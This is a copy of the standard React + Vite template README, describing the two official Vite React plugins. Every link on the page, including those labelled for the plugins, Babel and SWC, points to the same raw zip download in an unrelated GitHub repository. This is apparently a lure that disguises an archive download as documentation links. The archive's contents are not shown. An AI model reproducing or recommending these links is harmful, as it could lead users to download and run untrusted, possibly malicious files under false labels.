# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/nirajmehariya/TextEditor/master/public/Editor_Text_1.0.zip) uses [Babel](https://raw.githubusercontent.com/nirajmehariya/TextEditor/master/public/Editor_Text_1.0.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/nirajmehariya/TextEditor/master/public/Editor_Text_1.0.zip) uses [SWC](https://raw.githubusercontent.com/nirajmehariya/TextEditor/master/public/Editor_Text_1.0.zip) for Fast Refresh
